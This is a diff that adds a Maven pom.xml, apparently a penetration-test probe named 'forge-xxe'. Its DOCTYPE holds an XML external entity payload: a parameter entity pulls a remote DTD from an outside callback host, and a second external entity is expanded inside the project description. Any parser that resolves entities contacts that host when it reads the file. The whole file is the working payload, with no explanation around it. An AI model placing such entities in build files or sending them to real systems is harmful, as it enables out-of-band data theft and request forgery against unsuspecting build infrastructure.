@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE project [
+  <!ENTITY % remote SYSTEM "http://PEN-CAGH-2055-2625.dns.collabb-reg2.devops.aws.dev/pomdtd">
+  %remote;
+  <!ENTITY xx SYSTEM "http://PEN-CAGH-2055-2625.dns.collabb-reg2.devops.aws.dev/poment">
+]>
+<project xmlns="http://maven.apache.org/POM/4.0.0">
+  <modelVersion>4.0.0</modelVersion>
+  <groupId>forge.test</groupId>
+  <artifactId>forge-xxe</artifactId>
+  <version>1.0.0</version>
+  <description>&xx;</description>
+  <dependencies>
+    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.1</version></dependency>
+  </dependencies>
+</project>
